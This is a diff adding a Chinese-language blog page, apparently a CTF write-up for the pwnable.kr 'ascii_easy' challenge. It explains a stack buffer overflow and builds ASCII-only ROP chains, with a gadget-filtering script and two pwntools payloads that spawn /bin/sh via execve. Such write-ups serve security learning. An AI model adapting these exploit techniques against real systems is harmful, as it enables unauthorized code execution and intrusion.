@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="baidu-site-verification" content="093lY4ziMu" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="description" content="A hexo theme">
+    <meta name="keyword"  content="dusign, hexo-theme-snail">
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <!--<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>-->
+    <title>
+        
+          Pwnable.kr ascii_easy - kwk
+        
+    </title>
+
+    <link rel="canonical" href="https://tclhh.github.io/2020/05/05/Pwnable-kr-ascii-easy/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+
+    <!-- Custom CSS --> 
+    
+        
+<link rel="stylesheet" href="/css/dusign-light.css">
+
+        
+<link rel="stylesheet" href="/css/dusign-common-light.css">
+
+        
+<link rel="stylesheet" href="/css/font-awesome.css">
+
+        
+<link rel="stylesheet" href="/css/toc.css">
+
+        <!-- background effects end -->
+    
+    
+    <!-- Pygments Highlight CSS -->
+    
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+    
+<link rel="stylesheet" href="/css/widget.css">
+
+
+    
+<link rel="stylesheet" href="/css/rocket.css">
+
+
+    
+<link rel="stylesheet" href="/css/signature.css">
+
+
+    
+<link rel="stylesheet" href="/css/fonts.googleapis.css">
+
+
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+    <!-- photography -->
+    
+<link rel="stylesheet" href="/css/photography.css">
+
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- background effects start -->
+    
+    <!-- background effects end -->
+
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            
+                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('ascii_easy.jpg')
+                /*post*/
+            
+        
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
+                            
+                              <a class="tag" href="/tags/#pwnable.kr" title="pwnable.kr">pwnable.kr</a>
+                            
+                        </div>
+                        <h1>Pwnable.kr ascii_easy</h1>
+                        <h2 class="subheading"></h2>
+                        <span class="meta">
+                            Posted by  on
+                            2020-05-05
+                        </span>
+
+                        
+                            <div class="blank_box"></div>
+                            <span class="meta">
+                                Words <span class="post-count">975</span> and
+                                Reading Time <span class="post-count">4</span> Minutes
+                            </span>
+                            <div class="blank_box"></div>
+                            <!-- 不蒜子统计 start -->
+                            <span class="meta">
+                                Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
+                            </span>
+                            <!-- 不蒜子统计 end -->
+                        
+
+                    </div>
+                
+
+                </div>
+            </div>
+        </div>      
+    </div>
+
+    
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">ra1nt0c5ky&#39;s blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/categories/">Categories</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+
+                        
+                    
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="Pwnable-kr-ascii-easy"><a href="#Pwnable-kr-ascii-easy" class="headerlink" title="Pwnable.kr ascii_easy"></a>Pwnable.kr ascii_easy</h1><p>直接 <code>ida</code> 中查看源码，<code>vuln</code> 中存在 <code>bof</code>:</p>
+<p><img src="0x00.png" alt="0x00"></p>
+<p>源码很简单，总结一下：</p>
+<ul>
+<li>开了 <code>nx</code></li>
+<li><code>mmap</code> 在 <code>0x5555e000</code> 分配了一块内存，加载 <code>libc-2.15.so</code>，有全部权限（可执行）</li>
+<li>输入只能是 <code>32</code> ~ <code>127</code> 的 <code>ascii</code> </li>
+<li>栈溢出没有长度限制</li>
+</ul>
+<p>首先，拿到题目时，觉得应该看一下 <code>libc</code> 中哪些函数可以使用，简单的写了一个筛选的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">objdump -T libc<span class="number">-2.15</span>.so &gt; symbols</span><br><span class="line"></span><br><span class="line">-------------------------------------------------</span><br><span class="line"><span class="comment"># 筛选脚本(大致一样 ...)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fliter</span><span class="params">(addr)</span>:</span></span><br><span class="line">    a_78 = int(addr[<span class="number">2</span>:<span class="number">4</span>],<span class="number">16</span>)</span><br><span class="line">    a_56 = int(addr[<span class="number">4</span>:<span class="number">6</span>],<span class="number">16</span>)</span><br><span class="line">    a_34 = int(addr[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line">    a_12 = int(addr[<span class="number">8</span>:<span class="number">10</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> is_ascii(a_78) <span class="keyword">and</span> is_ascii(a_56) <span class="keyword">and</span> is_ascii(a_34) <span class="keyword">and</span> is_ascii(a_12):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_ascii</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (num &gt; <span class="number">31</span> <span class="keyword">and</span> num &lt; <span class="number">128</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"xxx"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">    addr = hex(<span class="number">0x5555e000</span> + int(i[<span class="number">2</span>:<span class="number">10</span>],<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">if</span> fliter(addr):</span><br><span class="line">        <span class="keyword">print</span> addr + i[<span class="number">10</span>:].strip(<span class="string">'\n'</span>)</span><br><span class="line">        </span><br><span class="line">------------------------------------------------</span><br><span class="line">python func.py &gt; filter</span><br><span class="line">cat filter | grep xxx</span><br></pre></td></tr></table></figure>
+<p>简单的看了一下 <code>/bin/sh</code>、<code>execv</code>、<code>system</code>：</p>
+<p><img src="0x01.jpg#pic_center" alt="0x01"></p>
+<p><code>/bin/sh</code> 、<code>system</code> 不能直接使用 <code>ascii</code> 输入， <code>execv</code> 可以 …</p>
+<p>这时，发现题目有提示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint : you don&#39;t necessarily have to jump at the beggining of a function. try to land anyware.</span><br></pre></td></tr></table></figure>
+<p>i.e. 我们可以直接使用 <code>ROP</code> ，通过加加减减之类的让 <code>/bin/sh</code> 、<code>system</code> 这些函数的地址出现；于是，我选择了 <code>/bin/sh</code> 和 <code>execv</code>。</p>
+<p>现在要构造 ROP chain，用 <code>ROPgadget</code> 和上面的那个脚本（稍微改改…）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc-2.15.so &gt; gadgets</span><br><span class="line">python func.py &gt; filtered_gadgets</span><br><span class="line">cat filtered_gadgets | grep xxx | grep xxx</span><br></pre></td></tr></table></figure>
+<p>手动构造 ROP Chain（刺激）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">bin_sh = <span class="number">0x556bb7ec</span></span><br><span class="line">execv  = <span class="number">0x55616740</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x55687923 : add al, 0x8b ; inc eax ; push eax ; ret</span></span><br><span class="line"><span class="comment"># 0x5557506b : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="comment"># 0x555f3237 : add eax, esi ; pop ebx ; pop esi ; sub eax, 0x10 ; pop edi ; ret</span></span><br><span class="line"><span class="comment"># 0x5563704c : pushal ; ret</span></span><br><span class="line"><span class="comment"># 0x556d2a51 : pop ecx ; add al, 0xa ; ret</span></span><br><span class="line"><span class="comment"># 0x5557506f : pop ebp ; ret (pop1)</span></span><br><span class="line"><span class="comment"># 0x5557506c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret (pop4)</span></span><br><span class="line"><span class="comment"># 0x5557506d : pop esi ; pop edi ; pop ebp ; ret (pop3)</span></span><br><span class="line"><span class="comment"># 0x2b366078 + 0x2a35577e</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x1c</span> + <span class="string">'bbbb'</span> + p32(<span class="number">0x5557506b</span>) + p32(<span class="number">0x2b366074</span>) + <span class="string">'ebx '</span> +  p32(<span class="number">0x2a35577e</span>) + <span class="string">'edi '</span> + p32(<span class="number">0x5557506d</span>) + p32(<span class="number">0x555f3237</span>) + <span class="string">'ebx '</span> + <span class="string">'esi '</span> + p32(<span class="number">0x5557506f</span>) + p32(<span class="number">0x556d2a51</span>) + p32(execv) + p32(<span class="number">0x5563704c</span>)</span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
+<p>主要流程就是：</p>
+<ul>
+<li>‘a’*0x1c：填充缓冲区</li>
+<li>‘bbbb’：old_ebp</li>
+<li>p32(0x5557506b)：第一个 <code>gadget</code> ，主要目的控制 <code>eax</code> 和 <code>esi</code> ，之后用 <code>add eax, esi</code> 构造出 <code>/bin/sh</code> 的地址</li>
+<li>p32(0x2b366074)：<code>pop eax</code> ，手动构造的第一个数据（可以随便选）</li>
+<li>‘ebx ‘ ：<code>pop ebx</code></li>
+<li>p32(0x2a35577e)：<code>pop esi</code> ，手动构造的第二个数据</li>
+<li>‘edi ‘：<code>pop edi</code></li>
+<li>p32(0x5557506d)：第六个 <code>gadget</code>，<code>pop ebp</code> 为后面的 <code>pushal</code> 后的 <code>ret</code> 服务</li>
+<li>p32(0x555f3237)：第二个 <code>gadget</code>，主要使用 <code>add</code></li>
+<li>‘ebx ‘：<code>pop ebx</code></li>
+<li>‘esi ‘：<code>pop esi</code></li>
+<li>p32(0x5557506f)：第五个 <code>gadget</code>，<code>pop1</code></li>
+<li><p>p32(0x556d2a51)：第三个 <code>gadget</code>，控制 <code>ecx</code>，此时 <code>/bin/sh</code> 的地址也构建成功（0x2b366074 + 0x2a35577e - 0x10 + 0xa）</p>
+</li>
+<li><p>p32(execv)：主要是根据 <code>pushal</code> 之后的栈布局，决定把 <code>execv</code> 的地址传给 <code>ecx</code></p>
+</li>
+<li><p>p32(0x5563704c)：第四个 <code>gadget</code>，<code>pushal</code></p>
+<p>指令执行的地址变化：</p>
+<p><code>0x5557506b</code> =&gt; <code>0x555f3237</code> =&gt; <code>0x556d2a51</code> =&gt; <code>0x5563704c</code> =&gt; <code>0x5557506f</code> =&gt; <code>0x5557506d</code></p>
+</li>
+</ul>
+<p>结果发现不行，调试时发现程序又 <code>push</code> 了 <code>ebx</code>，于是查看一下代码：</p>
+<p><img src="0x02.png" alt="0x02"></p>
+<p>并没有直接 <code>sub xxx</code>。后来查了一下，发现只有 <code>execve</code> 是内核级系统调用，剩下的几个 <code>exec</code> 都只是通过调用 <code>execve</code> 实现的。</p>
+<p>于是，想要通过查找 <code>sub</code> | <code>add ecx</code> 来修改 <code>ecx</code> 的值，结果并没有找到。后来发现自己的之前的栈构造错了，并没有留 <code>execv</code> 的返回地址 …… 我还在想我太菜了。突然想起，直接找个 <code>call execve</code> 不就行了嘛，连栈布局都不用改。成功找到一个：</p>
+<p> <img src="0x03.jpg#pic_center" alt="0x03"></p>
+<p>红框的就可以用。修改后的 <code>payload</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">bin_sh = <span class="number">0x556bb7ec</span></span><br><span class="line">execv  = <span class="number">0x55616740</span></span><br><span class="line">execve = <span class="number">0x5561676a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line"><span class="comment"># 0x55687923 : add al, 0x8b ; inc eax ; push eax ; ret</span></span><br><span class="line"><span class="comment"># 0x5557506b : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="comment"># 0x555f3237 : add eax, esi ; pop ebx ; pop esi ; sub eax, 0x10 ; pop edi ; ret</span></span><br><span class="line"><span class="comment"># 0x556c5375 : xor edi, ebp ; jmp eax</span></span><br><span class="line"><span class="comment"># 0x55687926 : push eax ; ret</span></span><br><span class="line"><span class="comment"># 0x5563704c : pushal ; ret</span></span><br><span class="line"><span class="comment"># 0x556d2a51 : pop ecx ; add al, 0xa ; ret</span></span><br><span class="line"><span class="comment"># 0x5557506f : pop ebp ; ret (pop1)</span></span><br><span class="line"><span class="comment"># 0x5557506c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret (pop4)</span></span><br><span class="line"><span class="comment"># 0x5557506d : pop esi ; pop edi ; pop ebp ; ret (pop3)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x1c</span> + <span class="string">'bbbb'</span> + p32(<span class="number">0x5557506b</span>) + p32(<span class="number">0x2b366074</span>) + <span class="string">'ebx '</span> +  p32(<span class="number">0x2a35577e</span>) + <span class="string">'edi '</span> + p32(<span class="number">0x5557506d</span>) + p32(<span class="number">0x555f3237</span>) + <span class="string">'ebx '</span> + <span class="string">'esi '</span> + p32(<span class="number">0x5557506f</span>) + p32(<span class="number">0x556d2a51</span>) + p32(execve) + p32(<span class="number">0x5563704c</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
+<p>输出都是 <code>ascii</code> ，直接把 <code>payload</code> 复制一下，特殊字符加个转义符号就行：</p>
+<p><img src="0x04.jpg#pic_center" alt="0x04"></p>
+<p>nice~ :）</p>
+<h2 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h2><ul>
+<li><a href="https://www.fermimn.edu.it/linux/quarta/x86/pusha.htm" target="_blank" rel="noopener">80386 Programmer’s Reference Manual — Opcode PUSHA</a></li>
+</ul>
+
+                
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    
+                    <li class="next">
+                        <a href="/2019/11/01/Hexo-Theme-Snail/" data-toggle="tooltip" data-placement="top" title="Hexo-Theme-Snail">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                <!-- tip start -->
+                
+
+                
+                <!-- tip end -->
+
+                <!-- Music start-->
+                
+                
+<link rel="stylesheet" href="/css/music-player/fonts/iconfont.css">
+
+
+<link rel="stylesheet" href="/css/music-player/css/reset.css">
+
+
+<link rel="stylesheet" href="/css/music-player/css/player.css">
+
+
+<div class="music-player">
+    <audio class="music-player__audio" ></audio>
+    <div class="music-player__main">
+        <div class="music-player__blur"></div>
+        <div class="music-player__disc">
+            <div class="music-player__image">
+                <img width="100%" src="" alt="">
+            </div>
+            <div class="music-player__pointer"><img width="100%" src="/img/cd_tou.png" alt=""></div>
+        </div>
+        <div class="music-player__controls">
+            <div class="music__info">
+                <h3 class="music__info--title">...</h3>
+                <p class="music__info--singer">...</p>
+            </div>
+            <div class="player-control">
+                <div class="player-control__content">
+                    <div class="player-control__btns">
+                        <div class="player-control__btn player-control__btn--prev"><i class="iconfont icon-prev"></i></div>
+                        <div class="player-control__btn player-control__btn--play"><i class="iconfont icon-play"></i></div>
+                        <div class="player-control__btn player-control__btn--next"><i class="iconfont icon-next"></i></div>
+                        <div class="player-control__btn player-control__btn--mode"><i class="iconfont icon-loop"></i></div>
+                    </div>
+                    <div class="player-control__volume">
+                        <div class="control__volume--icon player-control__btn"><i class="iconfont icon-volume"></i></div>
+                        <div class="control__volume--progress player_progress"></div>
+                    </div>
+                </div>
+                <div class="player-control__content">
+                    <div class="player__song--progress player_progress"></div>
+                    <div class="player__song--timeProgess nowTime">00:00</div>
+                    <div class="player__song--timeProgess totalTime">00:00</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<script src="/js/music-player/utill.js"></script>
+
+
+<script src="/js/music-player/jquery.min.js"></script>
+
+
+<script src="/js/music-player/player.js"></script>
+
+
+                
+                <!-- Music end -->
+
+                <!-- Sharing -->
+                
+                <!-- Sharing -->
+
+                <!-- gitment start -->
+                
+                <!-- gitment end -->
+
+                <!-- 来必力City版安装代码 -->
+                
+                <!-- City版安装代码已完成 -->
+
+                <!-- disqus comment start -->
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+    
+      
+        <aside id="sidebar">
+          <div id="toc" class="toc-article">
+          <strong class="toc-title">Contents</strong>
+          
+            
+              <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Pwnable-kr-ascii-easy"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Pwnable.kr ascii_easy</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#参阅"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">参阅</span></a></li></ol></li></ol>
+            
+          
+          </div>
+        </aside>
+      
+    
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
+                        
+                          <a class="tag" href="/tags/#pwnable.kr" title="pwnable.kr">pwnable.kr</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+
+
+<style  type="text/css">
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/tclhh">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                </ul>
+
+           
+            
+                <p class="copyright text-muted">
+                    Copyright &copy;  2020 
+                    <br>
+                    Powered by 
+                    <a href="https://github.com/dusign/hexo-theme-snail" target="_blank" rel="noopener">
+                        <i>hexo-theme-snail</i>
+                    </a> 
+
+                
+                </p>
+            
+            </div>
+        </div>
+    </div>
+
+</footer>
+
+<!-- jQuery -->
+
+<script src="/js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="/js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- Search -->
+
+<script src="/js/search.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://tclhh.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+<script>
+    // dynamic User by Hux
+    var _gaId = 'UA-XXXXXXXX-X';
+    var _gaDomain = '';
+
+    // Originial
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', _gaId, _gaDomain);
+    ga('send', 'pageview');
+</script>
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- Search -->
+
+    <script type="text/javascript">      
+        var search_path = "search.xml";
+        if (search_path.length == 0) {
+            search_path = "search.xml";
+        }
+    var path = "/" + search_path;
+    searchFunc(path, 'local-search-input', 'local-search-result');
+    </script>
+
+
+<!-- busuanzi -->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+
+    
+        <!-- background effects line -->
+        
+
+        
+
+        <!-- background effects end -->
+    
+
+    <!--<script size="50" alpha='0.3' zIndex="-999" src="/js/ribbonStatic.js"></script>-->
+    
+        <script src="/js/ribbonDynamic.js"></script>
+    
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+
+</html>
